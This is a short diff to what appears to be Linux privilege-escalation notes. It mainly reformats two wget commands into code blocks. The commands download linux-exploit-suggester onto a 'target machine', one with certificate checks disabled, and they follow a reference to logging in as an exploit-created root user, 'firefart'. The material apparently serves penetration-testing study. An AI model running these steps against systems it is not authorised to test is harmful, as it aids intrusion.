@@ -249,11 +249,19 @@ su firefart
 ```
 
 Enter generated password from exploit output.
-                   OR
+ 
+ ---
+                   
+            OR
+                   
 
 Type this in the target machine
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh --no-check-certificate (if not working the first alternative)
+```bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+```
+```bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh --no-check-certificate
+```
 
 After it 
 ```bash
